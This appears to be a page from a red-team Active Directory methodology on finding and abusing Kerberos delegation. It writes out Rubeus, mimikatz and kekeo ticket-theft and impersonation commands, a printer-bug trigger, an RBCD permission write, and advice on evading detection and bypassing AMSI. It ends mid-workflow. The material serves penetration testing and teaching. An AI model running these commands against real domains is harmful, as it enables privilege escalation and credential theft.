[Prev: 24_SPN_Enumeration_Techniques.md](./24_SPN_Enumeration_Techniques.md) | [Up: Index](./00_Enumeration_Index.md) | [Hub](./00_Methodology_Hub.md) | [Next: 26_Kerberos_Advanced_Attacks.md](./26_Kerberos_Advanced_Attacks.md)

# 🔓 Kerberos Delegation Abuse - Enumeration and Exploitation

> **⚠️ CRITICAL TOOL REQUIREMENT**: **Invisi-Shell** is mandatory for production environments to ensure stealth operations and avoid detection. See [Tool Arsenal](./01_Tool_Setup_Loading.md#-invisi-shell-complete-setup) for setup instructions.

## 📋 TABLE OF CONTENTS
1. [Overview](#-overview)
2. [Delegation Fundamentals](#-delegation-fundamentals)
3. [Delegation Enumeration](#-delegation-enumeration)
4. [Delegation Abuse Techniques](#-delegation-abuse-techniques)
5. [Advanced Delegation Attacks](#-advanced-delegation-attacks)
6. [Cross-References](#-cross-references)
7. [Quick Start Delegation Discovery](#-quick-start-delegation-discovery)
8. [Pivot Matrix: Strategic Next Steps](#-pivot-matrix-strategic-next-steps)
9. [Comprehensive Enumeration Tools](#-comprehensive-enumeration-tools)

## 🎯 OVERVIEW

**Kerberos Delegation Abuse** provides comprehensive techniques for discovering, analyzing, and exploiting Kerberos delegation configurations. This file focuses on the three types of delegation (unconstrained, constrained, and resource-based) and their exploitation for privilege escalation and lateral movement.

### **🌟 What You'll Learn**
- **Delegation types** and their security implications
- **Delegation enumeration** using multiple tools and methods
- **Delegation abuse techniques** for privilege escalation
- **Advanced delegation attacks** and exploitation methods
- **Real-world attack scenarios** and practical examples

---

## 🔓 DELEGATION FUNDAMENTALS

### **What is Kerberos Delegation?**
**Kerberos Delegation** is a security feature that allows a service to impersonate a user to access other services on their behalf. This creates a "double-hop" authentication scenario where services can act as users.

### **Delegation Types and Risk Levels**

```mermaid
graph TB
    subgraph "🔓 Kerberos Delegation Types"
        A[🎯 Delegation Types] --> B[🔴 Unconstrained]
        A --> C[🟡 Constrained]
        A --> D[🟠 Resource-Based]
        
        B --> B1[⚠️ Can access ANY service]
        B --> B2[⚠️ Complete domain compromise]
        B --> B3[⚠️ TGT capture attacks]
        
        C --> C1[🔒 Limited to specific services]
        C --> C2[🔒 Target computer control]
        C --> C3[🔒 Service-specific scope]
        
        D --> D1[🔐 Resource controls delegation]
        D --> D2[🔐 Target service permission]
        D --> D3[🔐 More secure by default]
    end
    
    subgraph "⚠️ Risk Assessment"
        E[🔴 CRITICAL RISK] --> F[Unconstrained Delegation]
        G[🟡 HIGH RISK] --> H[Constrained Delegation]
        I[🟠 MEDIUM RISK] --> J[Resource-Based Delegation]
    end
    
    style A fill:#ff6b6b,stroke:#333,stroke-width:3px
    style B fill:#ff4757,stroke:#333,stroke-width:2px
    style C fill:#ffa502,stroke:#333,stroke-width:2px
    style D fill:#ff6348,stroke:#333,stroke-width:2px
    style E fill:#ff4757,stroke:#333,stroke-width:3px
    style F fill:#ff4757,stroke:#333,stroke-width:2px
    style G fill:#ffa502,stroke:#333,stroke-width:2px
    style H fill:#ffa502,stroke:#333,stroke-width:2px
    style I fill:#ff6348,stroke:#333,stroke-width:2px
    style J fill:#ff6348,stroke:#333,stroke-width:2px
```


### **Delegation Attack Scenarios**
- **Unconstrained Delegation**: Service can access any service in the domain
- **Constrained Delegation**: Service limited to specific services on specific computers
- **Resource-Based Constrained Delegation (RBCD)**: Target service controls who can delegate to it

---

## 📋 **QUICK START DELEGATION DISCOVERY**

| Phase | Tool | Command | Purpose | OPSEC |
|------|------|---------|---------|------|
| 1 | MS AD Module | `Get-ADComputer -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -ResultSetSize 25` | Unconstrained hosts sample | 🟢 |
| 2 | PowerView | `Get-DomainUser -TrustedToAuth` | Constrained users | 🟡 |
| 3 | PowerView | `Get-DomainComputer -TrustedToAuth` | Constrained computers | 🟡 |
| 4 | PowerView | `Get-DomainObject -LDAPFilter '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)'` | RBCD presence | 🟡 |
| 5 | Red Team | `Rubeus s4u /user:svc /impersonateuser:admin /msdsspn:cifs/host /ptt` | S4U test (lab) | 🟠 |

## 🧭 **PIVOT MATRIX: STRATEGIC NEXT STEPS**

| Finding | Immediate Pivot | Goal | Tool/Technique |
|---------|-----------------|------|----------------|
| Unconstrained host | [26_Kerberos_Advanced_Attacks.md](./26_Kerberos_Advanced_Attacks.md) | TGT capture → golden | Rubeus dump, mimikatz tickets |
| Constrained to CIFS/LDAP | [26_Kerberos_Advanced_Attacks.md](./26_Kerberos_Advanced_Attacks.md) | File/DC access | Rubeus S4U2Self/Proxy |
| RBCD SD present | [26_Kerberos_Advanced_Attacks.md](./26_Kerberos_Advanced_Attacks.md) | Write SD → S4U chain | PowerView Set-DomainObject + Rubeus |

---

## 🛠️ **COMPREHENSIVE ENUMERATION TOOLS**

### 🔧 Microsoft‑Signed & Native
- `Get-ADUser -LDAPFilter '(msDS-AllowedToDelegateTo=*)' -Properties msDS-AllowedToDelegateTo -ResultSetSize 100`
- `Get-ADComputer -LDAPFilter '(msDS-AllowedToDelegateTo=*)' -Properties msDS-AllowedToDelegateTo -ResultSetSize 100`
- `Get-ADComputer -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'` (TRUSTED_FOR_DELEGATION)
- `Get-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=16777216)'` (TRUSTED_TO_AUTH_FOR_DELEGATION)
- `wevtutil`, `klist` for validation

### ⚔️ Offensive (PowerView/SharpView)
```powershell
# Unconstrained
Get-DomainComputer -Unconstrained
Get-DomainUser -Unconstrained

# Constrained (T2A/T4D)
Get-DomainUser -TrustedToAuth -Properties samaccountname,msDS-AllowedToDelegateTo
Get-DomainComputer -TrustedToAuth -Properties name,msDS-AllowedToDelegateTo

# RBCD
Get-DomainObject -LDAPFilter '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)' -Properties *

# Helpers
Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ObjectAceType -like '*AllowedTo*'}
Get-DomainTrust
```
```cmd
SharpView.exe Get-DomainComputer -Unconstrained
SharpView.exe Get-DomainUser -TrustedToAuth
SharpView.exe Get-DomainObject -LDAPFilter "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)"
```

### 🔴 Red Team (Delegation Ops)
```cmd
Rubeus.exe s4u /user:svc_http /rc4:NTLMHASH /impersonateuser:Administrator /msdsspn:http/web01.corp.local /ptt
Rubeus.exe dump
mimikatz.exe "privilege::debug" "kerberos::list" exit
kekeo.exe tgt::ask /user:svc /domain:corp.local /rc4:NTLMHASH
kekeo.exe tgs::s4u /user:svc /service:cifs/filesrv.corp.local /impersonate:admin
```

### 🛠️ Alternative & Specialized
- AdFind queries for UAC flags; DSInternals for ACE parsing

---

## 🎯 **DELEGATION COMMANDS (20+ PowerView/SharpView)**

```powershell
# Unconstrained
Get-DomainComputer -Unconstrained
Get-DomainUser -Unconstrained

# Constrained (users/computers)
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
Get-DomainUser -TrustedToAuth -Properties msDS-AllowedToDelegateTo | Select samaccountname,msDS-AllowedToDelegateTo
Get-DomainComputer -TrustedToAuth -Properties msDS-AllowedToDelegateTo | Select name,msDS-AllowedToDelegateTo

# RBCD
Get-DomainObject -LDAPFilter '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)' -Properties *

# Flag hunting via LDAP filters
Get-DomainUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=16777216)'
Get-DomainComputer -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

# ACL and trust context
Get-DomainObjectAcl -SearchBase (Get-Domain).DistinguishedName -ResolveGUIDs | Where {$_.ObjectAceType -like '*AllowedTo*'}
Get-DomainTrust
Get-ForestTrust

# Ticket prep (lab)
Get-DomainSPNTicket -SPN CIFS/* -OutputFormat Hashcat
```

## 🔍 DELEGATION ENUMERATION

### **1. Unconstrained Delegation Enumeration**

#### **PowerView - Unconstrained Delegation Discovery**
```powershell
# Find computers with unconstrained delegation
Write-Host "=== UNCONSTRAINED DELEGATION ENUMERATION ===" -ForegroundColor Green

# Find computers with unconstrained delegation
$unconstrainedComputers = Get-DomainComputer -Unconstrained -Properties Name, OperatingSystem, LastLogonDate, Description

Write-Host "Computers with Unconstrained Delegation: $($unconstrainedComputers.Count)" -ForegroundColor Red

foreach ($computer in $unconstrainedComputers) {
    Write-Host "  Computer: $($computer.Name)" -ForegroundColor White
    Write-Host "    OS: $($computer.OperatingSystem)" -ForegroundColor Cyan
    Write-Host "    Last Logon: $($computer.LastLogonDate)" -ForegroundColor Gray
    Write-Host "    Description: $($computer.Description)" -ForegroundColor Gray
    
    # Check if this is a high-value target
    if ($computer.Name -like "*DC*" -or $computer.Name -like "*SQL*" -or $computer.Name -like "*WEB*") {
        Write-Host "    ⚠️ HIGH-VALUE TARGET - Monitor closely!" -ForegroundColor Red
    }
    Write-Host ""
}

# Find users with unconstrained delegation
$unconstrainedUsers = Get-DomainUser -Unconstrained -Properties Name, ServicePrincipalName, LastLogonDate, AdminCount

Write-Host "Users with Unconstrained Delegation: $($unconstrainedUsers.Count)" -ForegroundColor Red

foreach ($user in $unconstrainedUsers) {
    Write-Host "  User: $($user.Name)" -ForegroundColor White
    Write-Host "    SPNs: $($user.ServicePrincipalName -join ', ')" -ForegroundColor Yellow
    Write-Host "    Last Logon: $($user.LastLogonDate)" -ForegroundColor Gray
    Write-Host "    Admin Count: $($user.AdminCount)" -ForegroundColor Gray
    
    if ($user.AdminCount -eq 1) {
        Write-Host "    ⚠️ PROTECTED ACCOUNT - High-value target!" -ForegroundColor Red
    }
    Write-Host ""
}
```

#### **Advanced Unconstrained Delegation Analysis**
```powershell
# Comprehensive unconstrained delegation analysis
Write-Host "=== COMPREHENSIVE UNCONSTRAINED DELEGATION ANALYSIS ===" -ForegroundColor Green

# Get all unconstrained objects
$allUnconstrained = Get-DomainObject -Unconstrained -Properties Name, ObjectClass, DistinguishedName, 
    LastLogonDate, Description, OperatingSystem

Write-Host "Total Unconstrained Objects: $($allUnconstrained.Count)" -ForegroundColor Cyan

# Categorize by object type
$unconstrainedComputers = $allUnconstrained | Where-Object { $_.ObjectClass -eq "computer" }
$unconstrainedUsers = $allUnconstrained | Where-Object { $_.ObjectClass -eq "user" }

Write-Host "`nUnconstrained Computers: $($unconstrainedComputers.Count)" -ForegroundColor Yellow
Write-Host "Unconstrained Users: $($unconstrainedUsers.Count)" -ForegroundColor Yellow

# Analyze risk levels
$criticalTargets = @()
$highTargets = @()
$mediumTargets = @()

foreach ($computer in $unconstrainedComputers) {
    $riskLevel = "Medium"
    $riskReason = @()
    
    if ($computer.Name -like "*DC*") {
        $riskLevel = "CRITICAL"
        $riskReason += "Domain Controller"
    }
    if ($computer.Name -like "*SQL*") {
        $riskLevel = "HIGH"
        $riskReason += "SQL Server"
    }
    if ($computer.Name -like "*WEB*") {
        $riskLevel = "HIGH"
        $riskReason += "Web Server"
    }
    if ($computer.Name -like "*FILE*") {
        $riskLevel = "HIGH"
        $riskReason += "File Server"
    }
    
    $computerInfo = @{
        Name = $computer.Name
        RiskLevel = $riskLevel
        RiskReasons = $riskReason -join ", "
        OS = $computer.OperatingSystem
        LastLogon = $computer.LastLogonDate
    }
    
    switch ($riskLevel) {
        "CRITICAL" { $criticalTargets += $computerInfo }
        "HIGH" { $highTargets += $computerInfo }
        default { $mediumTargets += $computerInfo }
    }
}

# Display results by risk level
Write-Host "`n🔴 CRITICAL TARGETS:" -ForegroundColor Red
foreach ($target in $criticalTargets) {
    Write-Host "  - $($target.Name)" -ForegroundColor White
    Write-Host "    Risk: $($target.RiskLevel) - $($target.RiskReasons)" -ForegroundColor Red
    Write-Host "    OS: $($target.OS)" -ForegroundColor Gray
    Write-Host "    Last Logon: $($target.LastLogon)" -ForegroundColor Gray
    Write-Host ""
}

Write-Host "🟡 HIGH TARGETS:" -ForegroundColor Yellow
foreach ($target in $highTargets) {
    Write-Host "  - $($target.Name)" -ForegroundColor White
    Write-Host "    Risk: $($target.RiskLevel) - $($target.RiskReasons)" -ForegroundColor Yellow
    Write-Host "    OS: $($target.OS)" -ForegroundColor Gray
    Write-Host "    Last Logon: $($target.LastLogon)" -ForegroundColor Gray
    Write-Host ""
}
```

### **2. Constrained Delegation Enumeration**

#### **PowerView - Constrained Delegation Discovery**
```powershell
# Find constrained delegation objects
Write-Host "=== CONSTRAINED DELEGATION ENUMERATION ===" -ForegroundColor Green

# Find users with constrained delegation
$constrainedUsers = Get-DomainUser -TrustedToAuth -Properties Name, ServicePrincipalName, 
    msDS-AllowedToDelegateTo, LastLogonDate, AdminCount

Write-Host "Users with Constrained Delegation: $($constrainedUsers.Count)" -ForegroundColor Yellow

foreach ($user in $constrainedUsers) {
    Write-Host "  User: $($user.Name)" -ForegroundColor White
    Write-Host "    SPNs: $($user.ServicePrincipalName -join ', ')" -ForegroundColor Yellow
    
    # Analyze delegation targets
    if ($user.'msDS-AllowedToDelegateTo') {
        Write-Host "    Delegation Targets:" -ForegroundColor Cyan
        foreach ($target in $user.'msDS-AllowedToDelegateTo') {
            Write-Host "      - $target" -ForegroundColor Gray
            
            # Check if target is high-value
            if ($target -like "*CIFS*" -or $target -like "*LDAP*" -or $target -like "*RPCSS*") {
                Write-Host "        ⚠️ HIGH-VALUE SERVICE - Dangerous delegation!" -ForegroundColor Red
            }
        }
    } else {
        Write-Host "    ⚠️ NO DELEGATION TARGETS - Misconfigured!" -ForegroundColor Red
    }
    
    Write-Host "    Last Logon: $($user.LastLogonDate)" -ForegroundColor Gray
    Write-Host "    Admin Count: $($user.AdminCount)" -ForegroundColor Gray
    Write-Host ""
}

# Find computers with constrained delegation
$constrainedComputers = Get-DomainComputer -TrustedToAuth -Properties Name, OperatingSystem, 
    msDS-AllowedToDelegateTo, LastLogonDate

Write-Host "Computers with Constrained Delegation: $($constrainedComputers.Count)" -ForegroundColor Yellow

foreach ($computer in $constrainedComputers) {
    Write-Host "  Computer: $($computer.Name)" -ForegroundColor White
    Write-Host "    OS: $($computer.OperatingSystem)" -ForegroundColor Cyan
    
    if ($computer.'msDS-AllowedToDelegateTo') {
        Write-Host "    Delegation Targets:" -ForegroundColor Cyan
        foreach ($target in $computer.'msDS-AllowedToDelegateTo') {
            Write-Host "      - $target" -ForegroundColor Gray
        }
    }
    Write-Host "    Last Logon: $($computer.LastLogonDate)" -ForegroundColor Gray
    Write-Host ""
}
```

#### **Constrained Delegation Target Analysis**
```powershell
# Analyze delegation targets for attack potential
Write-Host "=== DELEGATION TARGET ANALYSIS ===" -ForegroundColor Green

$allDelegationTargets = @()

# Collect all delegation targets from users
$constrainedUsers = Get-DomainUser -TrustedToAuth -Properties msDS-AllowedToDelegateTo
foreach ($user in $constrainedUsers) {
    if ($user.'msDS-AllowedToDelegateTo') {
        foreach ($target in $user.'msDS-AllowedToDelegateTo') {
            $allDelegationTargets += @{
                Target = $target
                Source = $user.Name
                SourceType = "User"
                Risk = "Unknown"
            }
        }
    }
}

# Collect all delegation targets from computers
$constrainedComputers = Get-DomainComputer -TrustedToAuth -Properties msDS-AllowedToDelegateTo
foreach ($computer in $constrainedComputers) {
    if ($computer.'msDS-AllowedToDelegateTo') {
        foreach ($target in $computer.'msDS-AllowedToDelegateTo') {
            $allDelegationTargets += @{
                Target = $target
                Source = $computer.Name
                SourceType = "Computer"
                Risk = "Unknown"
            }
        }
    }
}

# Analyze risk levels
foreach ($target in $allDelegationTargets) {
    if ($target.Target -like "*CIFS*" -or $target.Target -like "*LDAP*" -or $target.Target -like "*RPCSS*") {
        $target.Risk = "CRITICAL"
    } elseif ($target.Target -like "*HTTP*" -or $target.Target -like "*MSSQL*") {
        $target.Risk = "HIGH"
    } elseif ($target.Target -like "*FTP*" -or $target.Target -like "*SMTP*") {
        $target.Risk = "MEDIUM"
    } else {
        $target.Risk = "LOW"
    }
}

# Group by risk level
$criticalTargets = $allDelegationTargets | Where-Object { $_.Risk -eq "CRITICAL" }
$highTargets = $allDelegationTargets | Where-Object { $_.Risk -eq "HIGH" }
$mediumTargets = $allDelegationTargets | Where-Object { $_.Risk -eq "MEDIUM" }

Write-Host "`n🔴 CRITICAL DELEGATION TARGETS:" -ForegroundColor Red
foreach ($target in $criticalTargets) {
    Write-Host "  - $($target.Target)" -ForegroundColor White
    Write-Host "    Source: $($target.Source) ($($target.SourceType))" -ForegroundColor Gray
    Write-Host "    Risk: $($target.Risk)" -ForegroundColor Red
    Write-Host ""
}

Write-Host "🟡 HIGH DELEGATION TARGETS:" -ForegroundColor Yellow
foreach ($target in $highTargets) {
    Write-Host "  - $($target.Target)" -ForegroundColor White
    Write-Host "    Source: $($target.Source) ($($target.SourceType))" -ForegroundColor Gray
    Write-Host "    Risk: $($target.Risk)" -ForegroundColor Yellow
    Write-Host ""
}
```

### **3. Resource-Based Constrained Delegation (RBCD) Enumeration**

#### **PowerView - RBCD Discovery**
```powershell
# Find RBCD configurations
Write-Host "=== RESOURCE-BASED CONSTRAINED DELEGATION ENUMERATION ===" -ForegroundColor Green

# Find computers that can be delegated to
$rbcdComputers = Get-DomainComputer -Properties Name, msDS-AllowedToActOnBehalfOfOtherIdentity, 
    OperatingSystem, LastLogonDate

$rbcdEnabled = $rbcdComputers | Where-Object { $_.'msDS-AllowedToActOnBehalfOfOtherIdentity' }

Write-Host "Computers with RBCD Enabled: $($rbcdEnabled.Count)" -ForegroundColor Yellow

foreach ($computer in $rbcdEnabled) {
    Write-Host "  Computer: $($computer.Name)" -ForegroundColor White
    Write-Host "    OS: $($computer.OperatingSystem)" -ForegroundColor Cyan
    Write-Host "    Last Logon: $($computer.LastLogonDate)" -ForegroundColor Gray
    
    # Get the security descriptor
    $sd = $computer.'msDS-AllowedToActOnBehalfOfOtherIdentity'
    if ($sd) {
        Write-Host "    RBCD Security Descriptor:" -ForegroundColor Cyan
        Write-Host "      $sd" -ForegroundColor Gray
        
        # Parse the security descriptor to find allowed principals
        try {
            $acl = New-Object System.Security.AccessControl.RawSecurityDescriptor($sd)
            foreach ($ace in $acl.DiscretionaryAcl) {
                $sid = $ace.SecurityIdentifier
                $principal = Convert-SidToName $sid
                Write-Host "        Allowed Principal: $principal" -ForegroundColor Yellow
            }
        } catch {
            Write-Host "        Could not parse security descriptor" -ForegroundColor Red
        }
    }
    Write-Host ""
}
```

---

## ⚔️ DELEGATION ABUSE TECHNIQUES

### **1. Unconstrained Delegation Abuse**

#### **TGT Capture Attack**
```powershell
# Unconstrained delegation TGT capture attack
Write-Host "=== UNCONSTRAINED DELEGATION TGT CAPTURE ATTACK ===" -ForegroundColor Green

Write-Host "Attack Scenario: TGT Capture via Unconstrained Delegation" -ForegroundColor Red
Write-Host "`nPrerequisites:" -ForegroundColor Yellow
Write-Host "  1. Control a computer with unconstrained delegation" -ForegroundColor White
Write-Host "  2. High-privilege user connects to your service" -ForegroundColor White
Write-Host "  3. TGT is cached and can be extracted" -ForegroundColor White

Write-Host "`nAttack Steps:" -ForegroundColor Yellow
Write-Host "  1. Identify unconstrained delegation targets" -ForegroundColor White
Write-Host "  2. Compromise the target computer" -ForegroundColor White
Write-Host "  3. Wait for high-privilege user connection" -ForegroundColor White
Write-Host "  4. Extract cached TGTs" -ForegroundColor White
Write-Host "  5. Use TGTs for privilege escalation" -ForegroundColor White

Write-Host "`nHigh-Value Targets:" -ForegroundColor Yellow
Write-Host "  - Domain Controllers" -ForegroundColor Red
Write-Host "  - SQL Servers" -ForegroundColor Red
Write-Host "  - Web Servers" -ForegroundColor Red
Write-Host "  - File Servers" -ForegroundColor Red

Write-Host "`nDetection Evasion:" -ForegroundColor Yellow
Write-Host "  - Use legitimate services for TGT capture" -ForegroundColor White
Write-Host "  - Minimize suspicious activity" -ForegroundColor White
Write-Host "  - Clean up after TGT extraction" -ForegroundColor White
```

#### **Printer Bug Exploitation**
```powershell
# Printer Bug exploitation for TGT capture
Write-Host "=== PRINTER BUG EXPLOITATION ===" -ForegroundColor Green

Write-Host "Attack Scenario: Printer Bug + Unconstrained Delegation" -ForegroundColor Red
Write-Host "`nHow it works:" -ForegroundColor Yellow
Write-Host "  1. Enable unconstrained delegation on your computer" -ForegroundColor White
Write-Host "  2. Trigger authentication via MS-RPRN (Printer Bug)" -ForegroundColor White
Write-Host "  3. Capture TGTs from connecting users" -ForegroundColor White
Write-Host "  4. Use captured TGTs for lateral movement" -ForegroundColor White

Write-Host "`nPrinter Bug Commands:" -ForegroundColor Yellow
Write-Host "  # Trigger authentication from target DC" -ForegroundColor Gray
Write-Host "  SpoolSample.exe DC01.cybercorp.local ATTACKER-PC.cybercorp.local" -ForegroundColor White

Write-Host "`nTGT Extraction:" -ForegroundColor Yellow
Write-Host "  # Extract captured TGTs" -ForegroundColor Gray
Write-Host "  Rubeus.exe dump /nowrap" -ForegroundColor White
Write-Host "  mimikatz # sekurlsa::tickets /export" -ForegroundColor White

Write-Host "`nAttack Advantages:" -ForegroundColor Yellow
Write-Host "  - No user interaction required" -ForegroundColor White
Write-Host "  - Can target specific users" -ForegroundColor White
Write-Host "  - Stealthy authentication trigger" -ForegroundColor White
```

### **2. Constrained Delegation Abuse**

#### **Service Impersonation Attack**
```powershell
# Constrained delegation service impersonation
Write-Host "=== CONSTRAINED DELEGATION SERVICE IMPERSONATION ===" -ForegroundColor Green

Write-Host "Attack Scenario: Service Impersonation via Constrained Delegation" -ForegroundColor Red
Write-Host "`nPrerequisites:" -ForegroundColor Yellow
Write-Host "  1. Control account with constrained delegation" -ForegroundColor White
Write-Host "  2. Target service in delegation scope" -ForegroundColor White
Write-Host "  3. Valid user credentials for impersonation" -ForegroundColor White

Write-Host "`nAttack Steps:" -ForegroundColor Yellow
Write-Host "  1. Identify constrained delegation scope" -ForegroundColor White
Write-Host "  2. Compromise the delegation account" -ForegroundColor White
Write-Host "  3. Use S4U2Self for service ticket" -ForegroundColor White
Write-Host "  4. Impersonate high-privilege user" -ForegroundColor White
Write-Host "  5. Access target service" -ForegroundColor White

Write-Host "`nRubeus Commands:" -ForegroundColor Yellow
Write-Host "  # Request service ticket for specific user" -ForegroundColor Gray
Write-Host "  Rubeus.exe s4u /user:delegationaccount /rc4:hash /service:targetservice /impersonateuser:admin" -ForegroundColor White

Write-Host "`nTarget Services:" -ForegroundColor Yellow
Write-Host "  - CIFS (File access)" -ForegroundColor Red
Write-Host "  - LDAP (Directory access)" -ForegroundColor Red
Write-Host "  - RPCSS (Remote procedure calls)" -ForegroundColor Red
Write-Host "  - HTTP (Web services)" -ForegroundColor White
```

### **3. Resource-Based Constrained Delegation Abuse**

#### **RBCD Configuration Attack**
```powershell
# RBCD configuration attack
Write-Host "=== RESOURCE-BASED CONSTRAINED DELEGATION ABUSE ===" -ForegroundColor Green

Write-Host "Attack Scenario: RBCD Configuration Abuse" -ForegroundColor Red
Write-Host "`nPrerequisites:" -ForegroundColor Yellow
Write-Host "  1. Control account with write permissions to target computer" -ForegroundColor White
Write-Host "  2. Target computer allows RBCD configuration" -ForegroundColor White
Write-Host "  3. Ability to modify msDS-AllowedToActOnBehalfOfOtherIdentity" -ForegroundColor White

Write-Host "`nAttack Steps:" -ForegroundColor Yellow
Write-Host "  1. Identify target computer for RBCD" -ForegroundColor White
Write-Host "  2. Check write permissions to target" -ForegroundColor White
Write-Host "  3. Configure RBCD to allow your account" -ForegroundColor White
Write-Host "  4. Use S4U2Self for service ticket" -ForegroundColor White
Write-Host "  5. Access target service as impersonated user" -ForegroundColor White

Write-Host "`nPowerView Commands:" -ForegroundColor Yellow
Write-Host "  # Set RBCD for target computer" -ForegroundColor Gray
Write-Host "  Set-DomainObject -Identity TARGET-COMPUTER -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'='D:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;ATTACKER-SID)'}" -ForegroundColor White

Write-Host "`nRubeus Commands:" -ForegroundColor Yellow
Write-Host "  # Use S4U2Self with RBCD" -ForegroundColor Gray
Write-Host "  Rubeus.exe s4u /user:attackeraccount /rc4:hash /service:targetservice /impersonateuser:admin" -ForegroundColor White
```

---

## 🚀 ADVANCED DELEGATION ATTACKS

### **1. Multi-Hop Delegation Attacks**

#### **Delegation Chain Exploitation**
```powershell
# Multi-hop delegation chain exploitation
Write-Host "=== MULTI-HOP DELEGATION CHAIN EXPLOITATION ===" -ForegroundColor Green

Write-Host "Attack Scenario: Delegation Chain for Deep Lateral Movement" -ForegroundColor Red
Write-Host "`nChain Example:" -ForegroundColor Yellow
Write-Host "  User A → Service B → Service C → Service D" -ForegroundColor White
Write-Host "  Each hop expands access scope" -ForegroundColor White
Write-Host "  Can reach deeply nested services" -ForegroundColor White

Write-Host "`nAttack Planning:" -ForegroundColor Yellow
Write-Host "  1. Map all delegation relationships" -ForegroundColor White
Write-Host "  2. Identify delegation chains" -ForegroundColor White
Write-Host "  3. Plan optimal attack path" -ForegroundColor White
Write-Host "  4. Execute chain step by step" -ForegroundColor White
Write-Host "  5. Maintain access at each hop" -ForegroundColor White

Write-Host "`nChain Enumeration:" -ForegroundColor Yellow
Write-Host "  # Find all delegation relationships" -ForegroundColor Gray
Write-Host "  Get-DomainObject -TrustedToAuth -Properties Name, msDS-AllowedToDelegateTo" -ForegroundColor White
Write-Host "  Get-DomainComputer -Unconstrained -Properties Name" -ForegroundColor White

Write-Host "`nChain Visualization:" -ForegroundColor Yellow
Write-Host "  # Use BloodHound for delegation chain mapping" -ForegroundColor Gray
Write-Host "  # Analyze ShortestPathsToHighValueTargets" -ForegroundColor White
Write-Host "  # Look for delegation-based attack paths" -ForegroundColor White
```

### **2. Cross-Forest Delegation Attacks**

#### **Forest Trust Delegation Abuse**
```powershell
# Cross-forest delegation abuse
Write-Host "=== CROSS-FOREST DELEGATION ABUSE ===" -ForegroundColor Green

Write-Host "Attack Scenario: Cross-Forest Delegation via Trust Relationships" -ForegroundColor Red
Write-Host "`nPrerequisites:" -ForegroundColor Yellow
Write-Host "  1. Forest trust relationship exists" -ForegroundColor White
Write-Host "  2. Delegation allowed across trust" -ForegroundColor White
Write-Host "  3. Access to trusted forest resources" -ForegroundColor White

Write-Host "`nAttack Steps:" -ForegroundColor Yellow
Write-Host "  1. Enumerate forest trusts" -ForegroundColor White
Write-Host "  2. Identify cross-forest delegation" -ForegroundColor White
Write-Host "  3. Exploit delegation in trusted forest" -ForegroundColor White
Write-Host "  4. Access cross-forest resources" -ForegroundColor White
Write-Host "  5. Maintain persistence across forests" -ForegroundColor White

Write-Host "`nTrust Enumeration:" -ForegroundColor Yellow
Write-Host "  # Enumerate forest trusts" -ForegroundColor Gray
Write-Host "  Get-DomainTrust -Properties TrustType, TrustDirection, TrustAttributes" -ForegroundColor White
Write-Host "  # Look for Forest trust type" -ForegroundColor White

Write-Host "`nCross-Forest Delegation:" -ForegroundColor Yellow
Write-Host "  # Use S4U2Self across forest boundary" -ForegroundColor Gray
Write-Host "  Rubeus.exe s4u /user:delegationaccount /rc4:hash /service:crossforestservice /impersonateuser:crossforestuser" -ForegroundColor White
```

---

## 🔗 CROSS-REFERENCES

### **Related Kerberos Techniques**
- **Basic Kerberos Enumeration**: See [13_Kerberos_Basic_Enumeration.md](./23_Kerberos_Basic_Enumeration.md)
- **SPN Enumeration**: See [14_SPN_Enumeration_Techniques.md](./24_SPN_Enumeration_Techniques.md)
- **Advanced Attacks**: See [16_Kerberos_Advanced_Attacks.md](./26_Kerberos_Advanced_Attacks.md)

### **Related Enumeration Techniques**
- **User Enumeration**: See [02_User_Enumeration.md](./05_User_Enumeration.md)
- **Computer Enumeration**: See [03_Computer_Enumeration.md](./07_Computer_Enumeration.md)
- **Tool Setup**: See [01_Tool_Setup_Loading.md](./01_Tool_Setup_Loading.md)

### **Detection and Evasion**
- **Blue Team Detection**: See [11_Detection_Blue_Team.md](./32_Detection_Blue_Team.md)
- **Red Team Evasion**: See [12_Detection_Red_Team.md](./33_Detection_Red_Team.md)

---

## 🔐 COMPLETE ATTACK WORKFLOWS

### **1. ⚠️ Complete Unconstrained Delegation Attack Workflow**

#### **Step-by-Step Unconstrained Delegation Execution**
```powershell
# Complete Unconstrained Delegation Attack Workflow (CRITICAL MISSING CONTENT)
Write-Host "=== COMPLETE UNCONSTRAINED DELEGATION ATTACK WORKFLOW ===" -ForegroundColor Red

Write-Host "`n🎯 ATTACK OVERVIEW:" -ForegroundColor Yellow
Write-Host "Unconstrained delegation allows services to impersonate users to access ANY service in the domain." -ForegroundColor White

Write-Host "`n📋 PREREQUISITES:" -ForegroundColor Yellow
Write-Host "1. Control of computer with unconstrained delegation enabled" -ForegroundColor White
Write-Host "2. High-privilege user connects to your service" -ForegroundColor White
Write-Host "3. TGT capture capability" -ForegroundColor White

Write-Host "`n🚀 EXECUTION STEPS:" -ForegroundColor Yellow
Write-Host "1. For an example we have machine pwn1 as an Unconstrained user" -ForegroundColor White
Write-Host "2. Get a PowerShell session as a different user using 'Over pass the hash' attack" -ForegroundColor White
Write-Host "3. We can try searching for local admins it has access to using Find-LocalAdminAccess" -ForegroundColor White
Write-Host "4. Create a New-PSSession attaching to the 'Unconstrained user'" -ForegroundColor White
Write-Host "5. Enter the new session using Enter-PSSession" -ForegroundColor White
Write-Host "6. Bypass the AMSI" -ForegroundColor White
Write-Host "7. EXIT" -ForegroundColor White
Write-Host "8. Load Mimikatz.ps1 on the new session using Invoke-command" -ForegroundColor White
Write-Host "9. Enter the new session using Enter-PSSession again" -ForegroundColor White
Write-Host "10. Now we can get the admin token and save it to the disk" -ForegroundColor White
Write-Host "11. Try and check if you have any file from a DA" -ForegroundColor White
Write-Host "12. If not we can try to pull if there is any sessions logged on as Administrator" -ForegroundColor White
